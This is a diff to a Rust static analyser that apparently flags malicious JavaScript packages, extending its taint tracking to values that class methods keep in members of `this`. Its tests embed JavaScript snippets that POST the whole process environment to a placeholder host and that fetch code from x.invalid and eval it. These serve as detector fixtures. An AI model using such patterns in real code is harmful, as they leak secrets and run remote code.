@@ -751,16 +751,21 @@ fn is_one(name: &[u32], set: &[&str]) -> bool {
     set.iter().any(|s| eq(name, s))
 }
 
-/// The names of the members of a name a module puts anything into: a container's method called on it
-/// (`o.list.push(…)`, COLLECTS) or a call of PUTS_INTO_FIRST given it first (`Object.assign(o.opts, …)`), as
-/// written. Only those of a name's members are read as containers (sc_member_held, D-3b).
+/// The names of the members of a name (or of `this`: a method's, which a call on a name puts there, D-3c) a module
+/// puts anything into: a container's method called on it (`o.list.push(…)`, COLLECTS) or a call of PUTS_INTO_FIRST
+/// given it first (`Object.assign(o.opts, …)`), as written. Only those of a name's members are read as containers
+/// (sc_member_held, D-3b).
 pub(super) fn collected_members(a: &Ast) -> HashSet<PyStr> {
     let named_member = |n: NodeId| -> Option<PyStr> {
         if n == NONE {
             return None;
         }
         let n = a.unwrap(n);
-        if a.kind(n) == Kind::MemberExpression && !a.computed(n) && a.kind(a.at(n, jt::A)) == Kind::Identifier {
+        // (a member of `this` too: what a method keeps there is a name's after a call on it, D-3c)
+        if a.kind(n) == Kind::MemberExpression
+            && !a.computed(n)
+            && matches!(a.kind(a.at(n, jt::A)), Kind::Identifier | Kind::ThisExpression)
+        {
             a.prop_name(n)
         } else {
             None
@@ -2997,24 +3002,21 @@ impl<'p> Eval<'p> {
         out
     }
 
-    /// Is one of `fids` a method of a class made in several places (descs::Program::sc_made_widely)?
-    fn sc_widely_method(&mut self, fids: &[FnId]) -> bool {
-        fids.iter().any(|&f| match self.p.fns[f as usize].cls {
-            Some(c) => self.p.sc_made_widely(c),
-            None => false,
-        })
+    /// Is one of `fids` a method of a class?
+    fn sc_class_method(&mut self, fids: &[FnId]) -> bool {
+        fids.iter().any(|&f| self.p.fns[f as usize].cls.is_some())
     }
 
-    /// supply mode: `this`, in a method of a class made in several places: the method's receiver (RECV_INDEX), as
-    /// a parameter, which a call on an instance gives the instance's value (B-3: `r.setCode(t); r.run()`, where
-    /// `run` evals `this.c`, runs what `r` was given; B-1 keeps such a class's instances apart, so its `this.x` holds
-    /// nothing a call on an instance gives). Nothing elsewhere.
+    /// supply mode: `this`, in a method of a class: the method's receiver (RECV_INDEX), as a parameter, which a call
+    /// on an instance gives the instance's value (B-3: `r.setCode(t); r.run()`, where `run` evals `this.c`, runs what
+    /// `r` was given; B-1 keeps the instances of a class made in several places apart, so its `this.x` holds nothing
+    /// a call on an instance gives; D-3c: what a method keeps in a member of `this` as in a container is the
+    /// instance's, sc_kept, for a class made once too). Nothing elsewhere.
     pub(super) fn sc_this_value(&mut self, scope: ScopeId) -> V {
         let method = self.p.method_fn(scope);
-        let cls = self.p.fns[method as usize].cls;
-        match cls {
-            Some(c) if self.p.sc_made_widely(c) => V::param(method as u64 * PARAM_BASE + RECV_INDEX as u64, 0, false, 0),
-            _ => V::empty(),
+        match self.p.fns[method as usize].cls {
+            Some(_) => V::param(method as u64 * PARAM_BASE + RECV_INDEX as u64, 0, false, 0),
+            None => V::empty(),
         }
     }
 
@@ -3453,13 +3455,18 @@ impl<'p> Eval<'p> {
         let held = if own { recv.plain().through_member() } else { recv.plain() };
         let mut v;
         if !fids.is_empty() {
-            // (a method of a class made in several places: `this` is the value it is called on, B-3)
-            if member && self.sc_widely_method(&fids) {
+            // (a method of a class: `this` is the value it is called on, B-3, D-3c)
+            if member && self.sc_class_method(&fids) {
                 self.recv_val = Some(recv.plain());
             }
             v = self.apply(node, &fids, args, spread, line, false);
             self.recv_val = None;
             self.sc_param_calls(node, &fids, args, spread, scope);
+            if member {
+                self.sc_kept(callee, &fids, args, spread, scope);
+                let kept = self.sc_kept_returned(callee, &fids, scope);
+                v = v.union(&kept);
+            }
             if !definite {
                 let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                 v = v.union(&union_all(&plains)).union(&held);
@@ -3596,6 +3603,9 @@ impl<'p> Eval<'p> {
             }
             Kind::MemberExpression => {
                 let this = self.a().kind(self.a().at(obj, jt::A)) == Kind::ThisExpression;
+                if this {
+                    self.sc_keeps(obj, &v, scope);
+                }
                 if let Some(b) = self.sc_member_container(obj, scope) {
                     let v = if this { v.within(&BTreeSet::new()) } else { v };
                     if v.tainted() {
@@ -3605,6 +3615,111 @@ impl<'p> Eval<'p> {
             }
             _ => {}
         }
+    }
+
+    /// supply mode (D-3c): what a method keeps of its own parameters in a member of `this` as in a container
+    /// (`record(r, c) { this._events.push(new Event(r, c)) }`): the method's summary (Func::param_kept), which a call on
+    /// an instance gives that instance (sc_kept), not every instance's member (sc_put_into leaves them out of it).
+    fn sc_keeps(&mut self, member: NodeId, v: &V, scope: ScopeId) {
+        if !v.tainted() || v.params.is_empty() {
+            return;
+        }
+        let Some(name) = self.a().prop_name(member) else { return };
+        if self.a().computed(member) {
+            return;
+        }
+        let method = self.p.method_fn(scope) as FnId;
+        for &key in v.params.iter() {
+            if key & MEMBER_KEY == 0 && key_owner(key) == method && key_index(key) < MAX_PARAMS {
+                self.pk_adds.push((key, name.clone()));
+            }
+        }
+    }
+
+    /// supply mode (D-3c): a call of methods that keep what they are given in members of `this` (Func::param_kept):
+    /// on a name (`rec.record(type, detail)`), what each kept argument holds is put into that name, and into its
+    /// members' containers by those members' names (`rec._events`: sc_name_container), so that what reads the
+    /// instance, its member or a method's `this` given it (sc_this_value) has it, and no other instance; on `this`
+    /// (`this.record(x)` in another method), the caller keeps what it gives of its own parameters. On anything else
+    /// (`this.recorder.record(…)`, a call's result), nothing: the receiver is no name of this function's to hold it.
+    fn sc_kept(&mut self, callee: NodeId, fids: &[FnId], args: &[V], spread: isize, scope: ScopeId) {
+        let kept: Vec<(usize, Vec<PyStr>)> = fids
+            .iter()
+            .flat_map(|&f| self.p.fns[f as usize].param_kept.iter().map(|(&i, ns)| (i, ns.iter().cloned().collect())).collect::<Vec<_>>())
+            .collect();
+        if kept.is_empty() {
+            return;
+        }
+        let obj = self.a().unwrap(self.a().at(callee, jt::A));
+        let on_this = self.a().kind(obj) == Kind::ThisExpression;
+        let held = if self.a().kind(obj) == Kind::Identifier {
+            self.bind(obj, scope).filter(|&b| self.p.binds[b as usize].kind != BindKind::Import)
+        } else {
+            None
+        };
+        let method = self.p.method_fn(scope) as FnId;
+        for (i, names) in kept {
+            let t = super::eval::bound(args, spread, -1, i);
+            if !t.tainted() {
+                continue;
+            }
+            if on_this {
+                for &key in t.params.iter() {
+                    if key & MEMBER_KEY == 0 && key_owner(key) == method && key_index(key) < MAX_PARAMS {
+                        for n in &names {
+                            self.pk_adds.push((key, n.clone()));
+                        }
+                    }
+                }
+                continue;
+            }
+            let Some(b) = held else { continue };
+            self.write(b, t.plain(), false);
+            for n in &names {
+                if let Some(c) = self.sc_name_container(b, n) {
+                    self.write(c, t.plain(), false);
+                }
+            }
+        }
+    }
+
+    /// supply mode (D-3c): a method's `return this.<member>` as written, for its summary (Func::ret_kept).
+    pub(super) fn sc_returns_member(&mut self, e: NodeId) {
+        let name = {
+            let a = self.a();
+            let e = a.unwrap(e);
+            if a.kind(e) != Kind::MemberExpression || a.computed(e) || a.kind(a.at(e, jt::A)) != Kind::ThisExpression {
+                return;
+            }
+            match a.prop_name(e) {
+                Some(n) => n,
+                None => return,
+            }
+        };
+        if self.p.fns[self.fid as usize].cls.is_some() && !self.p.fns[self.fid as usize].ret_kept.contains(&name) {
+            self.rk_adds.push(name);
+        }
+    }
+
+    /// supply mode (D-3c): what a call on a name of methods that return members of `this` (Func::ret_kept) gives
+    /// back: what that name's members hold as containers (sc_kept put it there), not what every instance's do.
+    fn sc_kept_returned(&mut self, callee: NodeId, fids: &[FnId], scope: ScopeId) -> V {
+        let names: Vec<PyStr> = fids.iter().flat_map(|&f| self.p.fns[f as usize].ret_kept.iter().cloned().collect::<Vec<_>>()).collect();
+        if names.is_empty() {
+            return V::empty();
+        }
+        let obj = self.a().unwrap(self.a().at(callee, jt::A));
+        if self.a().kind(obj) != Kind::Identifier {
+            return V::empty();
+        }
+        let Some(b) = self.bind(obj, scope) else { return V::empty() };
+        let mut out = V::empty();
+        for n in names {
+            if let Some(c) = self.sc_name_container(b, &n) {
+                out = out.union(&self.read(c));
+            }
+        }
+        out
     }
 
     /// supply mode: a member as a container of its own (D-3b): `this.items` (a member of `this`, sc_this_member) or
@@ -3624,35 +3739,40 @@ impl<'p> Eval<'p> {
             Kind::ThisExpression => self.sc_this_member(member, scope),
             Kind::Identifier => {
                 let b = self.bind(obj, scope)?;
-                let held = &self.p.binds[b as usize];
-                if held.kind == BindKind::Import {
-                    return None;
-                }
-                let key = (5u8, b, name.clone());
-                if let Some(&got) = self.p.sc_props.get(&key) {
-                    return Some(got);
-                }
-                let (fid, shared, module) = (held.fid, held.shared, held.module);
-                let mut full = held.name.clone();
-                full.push(0x2E);
-                full.extend_from_slice(&name);
-                let bid = self.p.binds.len() as BindId;
-                self.p.binds.push(Bind {
-                    bid,
-                    name: full,
-                    kind: BindKind::Var,
-                    fid,
-                    writes: Vec::new(),
-                    shared,
-                    module,
-                    refs: Vec::new(),
-                    targets: None,
-                });
-                self.p.sc_props.insert(key, bid);
-                Some(bid)
+                self.sc_name_container(b, &name)
             }
             _ => None,
         }
+    }
+
+    /// The container a name's member `name` is (D-3b), made when first met; None for an import's.
+    fn sc_name_container(&mut self, b: BindId, name: &[u32]) -> Option<BindId> {
+        let held = &self.p.binds[b as usize];
+        if held.kind == BindKind::Import {
+            return None;
+        }
+        let key = (5u8, b, name.to_vec());
+        if let Some(&got) = self.p.sc_props.get(&key) {
+            return Some(got);
+        }
+        let (fid, shared, module) = (held.fid, held.shared, held.module);
+        let mut full = held.name.clone();
+        full.push(0x2E);
+        full.extend_from_slice(name);
+        let bid = self.p.binds.len() as BindId;
+        self.p.binds.push(Bind {
+            bid,
+            name: full,
+            kind: BindKind::Var,
+            fid,
+            writes: Vec::new(),
+            shared,
+            module,
+            refs: Vec::new(),
+            targets: None,
+        });
+        self.p.sc_props.insert(key, bid);
+        Some(bid)
     }
 
     /// supply mode: what a name's static member holds as a container (D-3b), when the module puts anything into a
@@ -4424,14 +4544,54 @@ mod tests {
         let src = "const https = require('https');\nconst q = { parts: [] };\nhttps.get('https://x.invalid/c', (r) => {\n  \
                    r.on('data', (d) => { q.parts.push(d); });\n  r.on('end', () => { eval(q.parts.join('')); });\n});\n";
         assert_eq!(runs(src), Some("run"));
-        // what a method is given, put into a member of this, is not what each caller gives (a recorder's events: a
-        // hub of everything every caller records, monaco-editor's loader)
+        // what a method is given, put into a member of this, is not every instance's (a recorder's events: a hub of
+        // everything every caller records, monaco-editor's loader): it is the instance's it is called on (D-3c)
         let src = format!(
             "class R {{\n  constructor() {{ this.events = []; }}\n  record(d) {{ this.events.push(d); }}\n  \
-             all() {{ return this.events; }}\n}}\nconst r = new R();\nr.record(process.env);\n{}",
-            post("JSON.stringify(r.all())")
+             all() {{ return this.events; }}\n}}\nconst r = new R();\nconst q = new R();\nr.record(process.env);\n{}",
+            post("JSON.stringify(q.all())")
         );
         assert_eq!(sent(&src), None);
+    }
+
+    #[test]
+    fn a_method_keeps_what_it_is_given_for_its_receiver() {
+        // D-3c: what a method is given and puts into a member of `this` as into a container is the instance's it is
+        // called on, in a class made once too: read back by another method's `this`, a method returning the member,
+        // the member or the instance itself; not by another instance
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
+        let env = found("environment", "the whole environment");
+        let class = |send: &str| {
+            format!(
+                "class R {{\n  constructor() {{ this.events = []; }}\n  record(d) {{ this.events.push(d); }}\n  \
+                 log(d) {{ this.record(d); }}\n  all() {{ return this.events; }}\n  flush() {{ {} }}\n}}\n",
+                send
+            )
+        };
+        let sends = class(&post("JSON.stringify(this.events)"));
+        let plain = class("return 0;");
+        for (cls, made, use_) in [
+            (&sends, "const r = new R();\nr.record(process.env);\n", "r.flush();\n".to_string()),
+            (&sends, "const r = new R();\nr.log(process.env);\n", "r.flush();\n".to_string()),
+            (&plain, "const r = new R();\nr.record(process.env);\n", post("JSON.stringify(r.all())")),
+            (&plain, "const r = new R();\nr.record(process.env);\n", post("JSON.stringify(r.events)")),
+            (&plain, "const r = new R();\nr.record(process.env);\n", post("JSON.stringify(r)")),
+            (&plain, "const r = new R();\nfunction keep() { r.record(process.env); }\nkeep();\n", post("JSON.stringify(r.all())")),
+        ] {
+            assert_eq!(sent(&format!("{}{}{}", cls, made, use_)), env, "{}{}", made, use_);
+        }
+        for (cls, made, use_) in [
+            (&sends, "const r = new R();\nconst q = new R();\nr.record(process.env);\n", "q.flush();\n".to_string()),
+            (&plain, "const r = new R();\nconst q = new R();\nr.record(process.env);\n", post("JSON.stringify(q.events)")),
+            (&plain, "const r = new R();\nr.record('x');\n", post("JSON.stringify(r.all())")),
+        ] {
+            assert_eq!(sent(&format!("{}{}{}", cls, made, use_)), None, "{}{}", made, use_);
+        }
+        // received code kept, then run by the instance's own method
+        let src = "class Q {\n  constructor() { this.parts = []; }\n  add(p) { this.parts.push(p); }\n  \
+                   run() { eval(this.parts.join('')); }\n}\nconst q = new Q();\nconst https = require('https');\n\
+                   https.get('https://x.invalid/c', (r) => {\n  r.on('data', (d) => { q.add(d); });\n  r.on('end', () => { q.run(); });\n});\n";
+        assert_eq!(runs(src), Some("run"));
     }
 
     #[test]
